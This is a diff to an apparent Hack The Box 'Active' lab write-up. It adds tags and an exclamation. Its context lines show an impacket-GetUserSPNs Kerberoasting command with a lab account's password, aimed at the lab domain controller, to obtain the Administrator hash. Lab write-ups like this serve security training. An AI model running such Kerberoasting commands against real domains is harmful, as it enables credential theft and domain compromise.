@@ -4,7 +4,7 @@ title:  HTB Active Write-up
 description: HTB Active Write-up
 date:   2024-11-01 01:00:00 +0300
 image:  '/images/htb_active.png'
-tags:   [Write-ups, HTB, OSCP+, Active-Directory, Kerberoasting]
+tags:   [Write-ups, HTB, OSCP+, Windows, Easy, Active-Directory, Kerberoasting]
 ---
 # Enumeration
 ### Nmap
@@ -146,6 +146,8 @@ Judging by the name of the SVC_TGS user, it's most likely to allow us Kerberoast
 ```shell
 impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.149.20 -request
 ```
+Eureka!
+
 Using the command above, we are able to successfully carry out our Kerberoasting attack and get the hash for the Administrator user:
 ```shell
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
